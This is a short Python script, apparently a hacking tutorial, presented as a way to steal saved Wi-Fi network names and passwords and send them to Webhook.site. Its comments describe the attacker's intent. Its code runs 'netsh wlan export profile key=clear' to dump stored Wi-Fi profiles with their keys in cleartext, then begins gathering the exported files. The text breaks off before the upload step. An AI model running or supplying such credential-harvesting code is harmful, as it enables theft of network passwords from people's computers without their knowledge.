#how to steal SSID and password using Webhook.site
#this are the commads using cmd
#netsh wlan show profile
#netsh wlan export profile key=clear
#attacker run this malicious code, which communicate with the website, sth malicious they are hosting and grabs your data.


import subprocess
#from builtins import open
#from io import open
import os, io

#Create a file for storing previous connected wifi.
password_file = open('passwords.txt', "w")
password_file.write("Hello sir! Here are your passwords.\n\n")
password_file.close()


#list
wifi_files = []
wifi_name = []
wifi_password = []



#We are going to execute a windows command such as a netsh command
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output= True).stdout.decode() #this will run the command for us
#just as the command line.

#grab current directory
path = os.getcwd()

#We want to grub that file whatever SSID is. ".xml"
#we are going to extract that name and the key in there


#Do the hacking and store the output
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)